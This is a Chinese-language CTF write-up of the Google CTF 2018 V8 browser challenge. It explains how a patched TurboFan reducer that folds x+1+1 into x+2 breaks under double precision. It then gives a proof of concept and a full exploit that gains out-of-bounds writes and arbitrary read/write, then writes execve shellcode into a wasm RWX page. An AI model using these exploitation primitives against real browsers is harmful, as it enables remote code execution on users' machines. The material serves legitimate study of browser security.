---

layout: post

title: 'google-ctf-2018-browser-pwn分析'

date: '2020-08-12'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'

---

<!-- more -->

## 前言

### 环境搭建

```c
（1）git reset --hard dde25872f58951bb0148cf43d6a504ab2f280485
（2）git apply < ../addition-reducer.patch
（手动添加题目补丁）
（3）gclient sync
（4）vim v8/BUILD.gn
修改为：    
v8_untrusted_code_mitigations = false
（5）
./tools/dev/gm.py x64.release
./tools/dev/gm.py x64.debug
（6）生成turbo图， 检查是否越界
./d8 --allow-natives-syntax --trace-turbo --trace-deopt poc.js
```



### v8的浮点数表示

v8中用double来表示浮点数，对应的数据格式如下：

![image-20200814105834697](..\image\2020-08-12-google-ctf-2018-browser-pwn分析\3.png)

分为符号位（S）, 指数位（Exp）,有效数位（Fraction），分别为1位、11位、52位。

所以浮点数所能表示的上界为将有数数位用1填满，包括隐藏的“1”，11……1，一共53位，值为2^53-1 = 9007199254740991，对应浮点数的表示十六进制为0x433fffffffffffff：

![image-20200814111127876](..\image\2020-08-12-google-ctf-2018-browser-pwn分析\4.png)



因为9007199254740991=11……1b（53位）=1.111……1b*2^52，指数位Exp=1023+52=1075=10000110011b，符号位S为0。

因为有效位只有52bit，所以一旦超过9007199254740991，就会失去精度，如9007199254740992，二进制表示为10……0b（53个0）=1.0*2^53，由于有效位只放前52个bit，所以最后一个bit是被舍去的，十六进制表示为0x4340000000000000。

![image-20200814113017280](..\image\2020-08-12-google-ctf-2018-browser-pwn分析\5.png)

同理9007199254740993 最后一个bit 1也是被舍去的，导致浮点数的十六进制表示也为0x4340000000000000。

具体数值转化如下：

| 十进制           | 二进制        | 浮点数十六进制     |
| ---------------- | ------------- | ------------------ |
| 9007199254740991 | 1.1……111*2^52 | 0x433fffffffffffff |
| 9007199254740992 | 1.0……000*2^53 | 0x4340000000000000 |
| 9007199254740993 | 1.0……001*2^53 | 0x4340000000000000 |
| 9007199254740994 | 1.0……010*2^53 | 0x4340000000000001 |
| 9007199254740995 | 1.0……011*2^53 | 0x4340000000000001 |
| 9007199254740996 | 1.0……100*2^53 | 0x4340000000000002 |
| 9007199254740997 | 1.0……101*2^53 | 0x4340000000000002 |
| 9007199254740998 | 1.0……110*2^53 | 0x4340000000000003 |
| 9007199254740999 | 1.0……111*2^53 | 0x4340000000000003 |

![image-20200814114343446](..\_posts\image\image-20200814114343446.png)

图中的红框的最后一位是在精度之外，被忽略的。



## 漏洞分析

官方writeup里就一页ppt：

![image-20200814102922188](..\image\2020-08-12-google-ctf-2018-browser-pwn分析\2.png)

根据前言中v8的浮点数介绍的表格可知 y+1+1并不等于y+2，如 9007199254740992+1+1=9007199254740992，而9007199254740992+2=9007199254740994 。

引入的漏洞补丁：

```c
diff --git a/BUILD.gn b/BUILD.gn
index c6a58776cd..14c56d2910 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -1699,6 +1699,8 @@ v8_source_set("v8_base") {
     "src/compiler/dead-code-elimination.cc",
     "src/compiler/dead-code-elimination.h",
     "src/compiler/diamond.h",
+    "src/compiler/duplicate-addition-reducer.cc",
+    "src/compiler/duplicate-addition-reducer.h",
     "src/compiler/effect-control-linearizer.cc",
     "src/compiler/effect-control-linearizer.h",
     "src/compiler/escape-analysis-reducer.cc",
diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc
new file mode 100644
index 0000000000..59e8437f3d
--- /dev/null
+++ b/src/compiler/duplicate-addition-reducer.cc
@@ -0,0 +1,71 @@
+// Copyright 2018 Google LLC
+//
+// Licensed under the Apache License, Version 2.0 (the "License");
+// you may not use this file except in compliance with the License.
+// You may obtain a copy of the License at
+//
+//      http://www.apache.org/licenses/LICENSE-2.0
+//
+// Unless required by applicable law or agreed to in writing, software
+// distributed under the License is distributed on an "AS IS" BASIS,
+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+// See the License for the specific language governing permissions and
+// limitations under the License.
+#include "src/compiler/duplicate-addition-reducer.h"
+
+#include "src/compiler/common-operator.h"
+#include "src/compiler/graph.h"
+#include "src/compiler/node-properties.h"
+
+namespace v8 {
+namespace internal {
+namespace compiler {
+
+DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,
+                     CommonOperatorBuilder* common)
+    : AdvancedReducer(editor),
+      graph_(graph), common_(common) {}
+
+Reduction DuplicateAdditionReducer::Reduce(Node* node) {
+  switch (node->opcode()) {
+    case IrOpcode::kNumberAdd:
+      return ReduceAddition(node);
+    default:
+      return NoChange();
+  }
+}
+
+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
+  DCHECK_EQ(node->op()->ControlInputCount(), 0);
+  DCHECK_EQ(node->op()->EffectInputCount(), 0);
+  DCHECK_EQ(node->op()->ValueInputCount(), 2);
+
+  Node* left = NodeProperties::GetValueInput(node, 0);
+  if (left->opcode() != node->opcode()) {
+    return NoChange();
+  }
+
+  Node* right = NodeProperties::GetValueInput(node, 1);
+  if (right->opcode() != IrOpcode::kNumberConstant) {
+    return NoChange();
+  }
+
+  Node* parent_left = NodeProperties::GetValueInput(left, 0);
+  Node* parent_right = NodeProperties::GetValueInput(left, 1);
+  if (parent_right->opcode() != IrOpcode::kNumberConstant) {
+    return NoChange();
+  }
+
+  double const1 = OpParameter<double>(right->op());
+  double const2 = OpParameter<double>(parent_right->op());
+  Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
+
+  NodeProperties::ReplaceValueInput(node, parent_left, 0);
+  NodeProperties::ReplaceValueInput(node, new_const, 1);
+
+  return Changed(node);
+}
+
+}  // namespace compiler
+}  // namespace internal
+}  // namespace v8
diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.h
new file mode 100644
index 0000000000..7285f1ae3e
--- /dev/null
+++ b/src/compiler/duplicate-addition-reducer.h
@@ -0,0 +1,60 @@
+/*
+ * Copyright 2018 Google LLC
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_
+#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_
+
+#include "src/base/compiler-specific.h"
+#include "src/compiler/graph-reducer.h"
+#include "src/globals.h"
+#include "src/machine-type.h"
+
+namespace v8 {
+namespace internal {
+namespace compiler {
+
+// Forward declarations.
+class CommonOperatorBuilder;
+class Graph;
+
+class V8_EXPORT_PRIVATE DuplicateAdditionReducer final
+    : public NON_EXPORTED_BASE(AdvancedReducer) {
+ public:
+  DuplicateAdditionReducer(Editor* editor, Graph* graph,
+                      CommonOperatorBuilder* common);
+  ~DuplicateAdditionReducer() final {}
+
+  const char* reducer_name() const override { return "DuplicateAdditionReducer"; }
+
+  Reduction Reduce(Node* node) final;
+
+ private:
+  Reduction ReduceAddition(Node* node);
+
+  Graph* graph() const { return graph_;}
+  CommonOperatorBuilder* common() const { return common_; };
+
+  Graph* const graph_;
+  CommonOperatorBuilder* const common_;
+
+  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);
+};
+
+}  // namespace compiler
+}  // namespace internal
+}  // namespace v8
+
+#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_
diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc
index 5717c70348..8cca161ad5 100644
--- a/src/compiler/pipeline.cc
+++ b/src/compiler/pipeline.cc
@@ -27,6 +27,7 @@
 #include "src/compiler/constant-folding-reducer.h"
 #include "src/compiler/control-flow-optimizer.h"
 #include "src/compiler/dead-code-elimination.h"
+#include "src/compiler/duplicate-addition-reducer.h"
 #include "src/compiler/effect-control-linearizer.h"
 #include "src/compiler/escape-analysis-reducer.h"
 #include "src/compiler/escape-analysis.h"
@@ -1301,6 +1302,8 @@ struct TypedLoweringPhase {
                                data->jsgraph()->Dead());
     DeadCodeElimination dead_code_elimination(&graph_reducer, data->graph(),
                                               data->common(), temp_zone);
+    DuplicateAdditionReducer duplicate_addition_reducer(&graph_reducer, data->graph(),
+                                              data->common());
     JSCreateLowering create_lowering(&graph_reducer, data->dependencies(),
                                      data->jsgraph(), data->js_heap_broker(),
                                      data->native_context(), temp_zone);
@@ -1318,6 +1321,7 @@ struct TypedLoweringPhase {
                                          data->js_heap_broker(), data->common(),
                                          data->machine(), temp_zone);
     AddReducer(data, &graph_reducer, &dead_code_elimination);
+    AddReducer(data, &graph_reducer, &duplicate_addition_reducer);
     AddReducer(data, &graph_reducer, &create_lowering);
     AddReducer(data, &graph_reducer, &constant_folding_reducer);
     AddReducer(data, &graph_reducer, &typed_optimization);
```

补丁引入了对kNumberAdd节点的优化，遇到数字的加法进行优化，如下：

```javascript
var x = y + 1 + 1;
=>
var x = y + 2;
```

因此配合浮点数精度计算，会导致 y+1+1并不等于y+2，导致x优化前后的值不同，绕过v8的CheckBound 检查，造成越界读写。

Poc 代码（Number.MAX_SAFE_INTEGER 为9007199254740991）：

```javascript
function foo_1(flag)
{
        let a = new Array(1.1,1.2,1.3,1.4,1.5);
        let x = (flag == "foo") ? Number.MAX_SAFE_INTEGER+5:Number.MAX_SAFE_INTEGER+1;
        let tmp1 = x+1+1;
        let idx = tmp1 - (Number.MAX_SAFE_INTEGER+1);
		return idx;
        //return a[idx];
}
console.log(foo("foo"));
console.log(foo(""));
%OptimizeFunctionOnNextCall(foo);
console.log(foo("foo"));
```

输出结果为：

```
4
0
6
```

Typer阶段：

推测x的范围为（Number.MAX_SAFE_INTEGER+1， Number.MAX_SAFE_INTEGER+5），即Range(9007199254740992, 9007199254740996)，未优化前，tmp1 = x + 1 + 1；但因为9007199254740992 + 1 + 1=9007199254740992 ，9007199254740996 + 1 + 1=9007199254740996 ，所以tmp1 的范围也是（9007199254740994，007199254740996），造成最后idx的范围为（0，4）。

![](..\image\2020-08-12-google-ctf-2018-browser-pwn分析\6.png)

但经过优化后，x + 1 + 1 => x+2，而 9007199254740992 + 2=9007199254740994，9007199254740996+2=9007199254740998，导致tmp1的范围为（9007199254740994，007199254740998），最后idx的范围为（2，6）。而Turbofan 认为idx范围为（0，4），不会访问越界，所以消除了后面的CheckBound，导致可以越界读写。

## 漏洞利用

利用越界读写修改float_array的length，利用old space中浮点数的element在jsArray前面的特性，修改自身的length，而不需要在后面布一个float_array（调试中在后面放置float对象，偏移也不固定）。

这里float_array[length-1] 离 float_array.length的位置为0x20, 即差4个数据的大小，而之前poc求出，Turbofan认为idx=4，实际求出idx=6，所以利用乘法将idx的范围扩大，使之正好覆盖到float_array.length。求出6x - 4x=4 => x=2.

所以最后越界读写的Poc如下：

```javascript
var obj = [];
var data_buf;
var float_array;

function foo(flag)
{
	float_array = [1.0,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8];
	let x = (flag == "foo") ? Number.MAX_SAFE_INTEGER+5:Number.MAX_SAFE_INTEGER+1;
	let tmp1 = x+1+1;
	let idx = tmp1 - (Number.MAX_SAFE_INTEGER+1);
	idx = idx * 2;                                           // <-----------------------
	float_array[idx] = 1.74512933848984e-310;
}
foo("foo");
for(let i=0; i<10000; i++){
	foo("");
}

foo("foo");
console.log("float_array length: 0x"+hex(float_array.length));
```

后面就可以通过

（1）根据mark查找wasm_function对象的地址

（2）根据data_buf的大小查找data_buf->backing_store，用于构造任意读写原语

（3）根据wasm_function–>shared_info–>WasmExportedFunctionData（data）–>instance+0xe8 找到rwx的区域，将shellcode写入该区域即可。



exp 代码：

```javascript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	let tmp = Array.from(Uint32);
	return tmp[1] * 0x100000000 + tmp[0]; 
}

function i2f(i)
{
	let tmp = [];
	tmp[0] = parseInt(i % 0x100000000);
	tmp[1] = parseInt((i-tmp[0]) / 0x100000000);
	Uint32.set(tmp);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}


function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var obj = [];
var data_buf;
var float_array;

function foo(flag)
{
	float_array = [1.0,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8];
	let x = (flag == "foo") ? Number.MAX_SAFE_INTEGER+5:Number.MAX_SAFE_INTEGER+1;
	let tmp1 = x+1+1;
	let idx = tmp1 - (Number.MAX_SAFE_INTEGER+1);
	idx = idx * 2;
	float_array[idx] = 1.74512933848984e-310;
}
foo("foo");
for(let i=0; i<10000; i++){
	foo("");
}

//%OptimizeFunctionOnNextCall(foo);
foo("foo");
console.log("float_array length: 0x"+hex(float_array.length));
//gc();

data_buf = new ArrayBuffer(0x233);
obj = {mark: i2f(0xdeadbeef), obj: wasm_function};

//---------find wasm_function
var float_obj_idx = 0;
for(let i=0; i < 0x400; i++)
{
	if(f2i(float_array[i]) == 0xdeadbeef){
		float_obj_idx = i + 1;
		console.log("[+] find wasm_function obj : 0x" + hex(f2i(float_array[float_obj_idx])));
		break;
	}
}

//------ find backing_store
var data_view = new DataView(data_buf);
var float_buffer_idx = 0;
for(let i=0; i < 0x1000; i++)
{
	if(f2i(float_array[i]) == 0x233){
		float_buffer_idx = i + 1;
		console.log("[+] find data_buf backing_store : 0x" + hex(f2i(float_array[float_buffer_idx])));
		break;
	}
}

//----- arbitrary read
function dataview_read64(addr)
{
	float_array[float_buffer_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	float_array[float_buffer_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

//----- get wasm_code by AAR

var wasm_function_addr = f2i(float_array[float_obj_idx]);
console.log("[+] wasm_function_addr: 0x"+hex(wasm_function_addr));

var wasm_shared_info = dataview_read64(wasm_function_addr -1 + 0x18);
console.log("[+] find wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_data = dataview_read64(wasm_shared_info -1 + 0x8);
console.log("[+] find wasm_data : 0x" + hex(wasm_data));

var wasm_instance = dataview_read64(wasm_data -1 + 0x10);
console.log("[+] find wasm_instance : 0x" + hex(wasm_instance));

var wasm_rwx = dataview_read64(wasm_instance - 1 + 0xe8);
console.log("[+] find wasm_rwx : 0x" + hex(wasm_rwx));


//write shellcode to wasm
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_rwx, shellcode);

wasm_function();
```



运行效果图：

![image-20200813201506045](..\image\2020-08-12-google-ctf-2018-browser-pwn分析\1.png)

## 参考链接

https://mem2019.github.io/jekyll/update/2019/08/09/Google-CTF-2018-Final-JIT.html